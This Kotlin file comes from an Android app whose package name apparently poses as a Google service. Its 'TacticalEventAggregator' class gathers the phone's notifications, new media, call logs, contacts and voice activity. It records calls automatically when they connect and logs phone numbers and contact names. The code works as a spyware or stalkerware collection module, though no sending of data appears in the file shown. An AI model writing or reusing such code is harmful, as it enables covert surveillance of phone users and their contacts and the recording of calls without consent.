package com.opp.googleoperation.telemetry

import android.content.Context
import android.util.Log
import com.opp.googleoperation.data.model.AudioThreatEvent
import com.opp.googleoperation.data.model.CallEvent
import com.opp.googleoperation.data.model.ContactEvent
import com.opp.googleoperation.data.model.MediaEvent
import com.opp.googleoperation.data.model.NotificationEvent
import com.opp.googleoperation.service.NotificationReceiverService
import com.opp.googleoperation.telemetry.audio.VoiceActivityDetector
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.flow.MutableSharedFlow
import kotlinx.coroutines.flow.SharedFlow
import kotlinx.coroutines.flow.asSharedFlow
import kotlinx.coroutines.launch

class TacticalEventAggregator(
    private val ctx: Context,
    private val scope: CoroutineScope
) {
    companion object {
        private const val TAG = "EventAggregator"
        private val _recentNotifications = MutableSharedFlow<NotificationEvent>(extraBufferCapacity = 50)
        val recentNotifications: SharedFlow<NotificationEvent> = _recentNotifications.asSharedFlow()

        private val _recentMediaEvents = MutableSharedFlow<MediaEvent>(extraBufferCapacity = 50)
        val recentMediaEvents: SharedFlow<MediaEvent> = _recentMediaEvents.asSharedFlow()

        private val _recentThreatEvents = MutableSharedFlow<AudioThreatEvent>(extraBufferCapacity = 30)
        val recentThreatEvents: SharedFlow<AudioThreatEvent> = _recentThreatEvents.asSharedFlow()

        private val _recentCallEvents = MutableSharedFlow<CallEvent>(extraBufferCapacity = 30)
        val recentCallEvents: SharedFlow<CallEvent> = _recentCallEvents.asSharedFlow()

        private val _recentContactEvents = MutableSharedFlow<ContactEvent>(extraBufferCapacity = 50)
        val recentContactEvents: SharedFlow<ContactEvent> = _recentContactEvents.asSharedFlow()
    }

    private val mediaObserver = MediaObserver(ctx, scope)
    private val voiceActivityDetector = VoiceActivityDetector(ctx, scope)
    private val callLogObserver = CallLogObserver(ctx, scope)
    private val callStateTracker = CallStateTracker(ctx, scope)
    private val contactsObserver = ContactsObserver(ctx, scope)
    private var isStarted = false

    fun start() {
        if (isStarted) return
        isStarted = true

        mediaObserver.startObserving()
        voiceActivityDetector.start()
        callLogObserver.startObserving()
        callStateTracker.start()
        contactsObserver.startObserving()

        scope.launch {
            NotificationReceiverService.notificationEvents.collect { notif ->
                Log.d(TAG, "relaying notification: [${notif.appName}] ${notif.title}")
                _recentNotifications.tryEmit(notif)
            }
        }

        scope.launch {
            MediaObserver.mediaEvents.collect { media ->
                Log.d(TAG, "relaying new media: [${media.mediaType}] ${media.fileName}")
                _recentMediaEvents.tryEmit(media)
            }
        }

        scope.launch {
            VoiceActivityDetector.voiceEvents.collect { voiceEvent ->
                Log.d(TAG, "relaying voice/conversation event: [${voiceEvent.threatType}] score=${voiceEvent.confidenceScore}")
                _recentThreatEvents.tryEmit(voiceEvent)
            }
        }

        scope.launch {
            CallLogObserver.callLogEvents.collect { callEvent ->
                Log.d(TAG, "relaying call log: [${callEvent.callType}] ${callEvent.phoneNumber}")
                _recentCallEvents.tryEmit(callEvent)
            }
        }

        scope.launch {
            ContactsObserver.contactEvents.collect { contactEvent ->
                Log.d(TAG, "relaying contact event: [${contactEvent.name}] ${contactEvent.phoneNumber}")
                _recentContactEvents.tryEmit(contactEvent)
            }
        }

        scope.launch {
            CallStateTracker.liveCallEvents.collect { liveCall ->
                Log.d(TAG, "relaying live call state: [${liveCall.callState}] ${liveCall.phoneNumber}")
                if (liveCall.callState == "OFFHOOK") {
                    voiceActivityDetector.startCallRecordingSession(liveCall.phoneNumber, liveCall.contactName)
                } else if (liveCall.callState == "COMPLETED") {
                    voiceActivityDetector.stopAndEmitCallRecording(liveCall.durationSeconds)
                }
            }
        }
    }

    fun refreshSubsystems() {
        mediaObserver.startObserving()
        voiceActivityDetector.start()
        callLogObserver.startObserving()
        callStateTracker.start()
        contactsObserver.startObserving()
    }

    fun stop() {
        mediaObserver.stopObserving()
        voiceActivityDetector.stop()
        callLogObserver.stopObserving()
        callStateTracker.stop()
        contactsObserver.stopObserving()
        isStarted = false
    }

    fun triggerManualDuressAudio() {
        voiceActivityDetector.triggerManualDuressSnapshot()
    }
}
